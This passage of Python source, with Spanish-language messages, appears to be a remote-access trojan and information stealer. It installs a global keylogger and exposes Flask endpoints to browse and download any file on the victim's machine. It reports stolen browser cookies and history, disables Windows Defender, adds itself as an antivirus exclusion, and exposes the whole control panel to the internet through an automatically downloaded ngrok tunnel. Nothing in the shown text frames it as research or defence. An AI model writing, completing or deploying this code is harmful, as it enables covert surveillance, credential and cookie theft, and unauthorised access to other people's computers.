    user = os.getlogin()
    
    return jsonify({
        'hostname': hostname,
        'ip': ip_address,
        'user': user,
        'keylogger_active': log_active,
        'cookies_count': len(extracted_cookies),
        'history_count': len(extracted_history),
        'keylog_count': len(key_log),
        'extraction_complete': extraction_complete
    })

@app.route('/api/list_files', methods=['GET'])
def api_list_files():
    global current_dir
    try:
        files = os.listdir(current_dir)
        output = "\n".join(files)
        if not output:
            output = "[Directorio vacío]"
        return jsonify({'success': True, 'files': output, 'current_dir': current_dir})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/change_dir', methods=['POST'])
def api_change_dir():
    global current_dir
    data = request.json
    path = data.get('path', '')
    
    try:
        new_path = os.path.abspath(os.path.join(current_dir, path))
        if os.path.isdir(new_path):
            current_dir = new_path
            return jsonify({'success': True, 'message': f'Cambiado a {current_dir}', 'current_dir': current_dir})
        else:
            return jsonify({'success': False, 'error': 'Directorio no encontrado'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/go_up', methods=['GET'])
def api_go_up():
    global current_dir
    try:
        parent = os.path.dirname(current_dir)
        if os.path.isdir(parent):
            current_dir = parent
            return jsonify({'success': True, 'message': f'Cambiado a {current_dir}', 'current_dir': current_dir})
        else:
            return jsonify({'success': False, 'error': 'No se puede subir más'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/download_file')
def api_download_file():
    global current_dir
    file_name = request.args.get('file', '')
    
    try:
        target = os.path.join(current_dir, file_name)
        if os.path.isfile(target):
            return send_file(target, as_attachment=True)
        else:
            return "Archivo no encontrado", 404
    except Exception as e:
        return str(e), 500


def on_key_event(e):
    if e.event_type == keyboard.KEY_DOWN and log_active:
        key_name = e.name
        key_name = f"[{key_name.upper()}]" if len(key_name) > 1 else key_name
        key_log.append(key_name)

keyboard.hook(on_key_event)

def initialize_system():
    disable_defender()
    add_exclusion(sys.argv[0])
    load_config()
    
    auto_extract_data()

if __name__ == '__main__':
    initialize_system()
    
    print("🚀 Iniciando interfaz web...")
    print("🔍 Extrayendo datos automáticamente (ABE)...")
    print("⌨️ Keylogger activado")
    
    flask_thread = threading.Thread(target=start_flask, daemon=True)
    flask_thread.start()
    
    time.sleep(2)
    
    ngrok_path = download_ngrok()
    ngrok_url = start_ngrok(ngrok_path)
    
    if ngrok_url:
        print(f"✅ Sistema activo en: {ngrok_url}")
        print("✅ Keylogger funcionando")
        print("✅ Extracción ABE de datos completada")
        print("✅ Interfaz web lista")
    else:
        print("⚠️  Ngrok falló, interfaz local disponible en http://localhost:5000")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_services()
        print("\nApagando...")
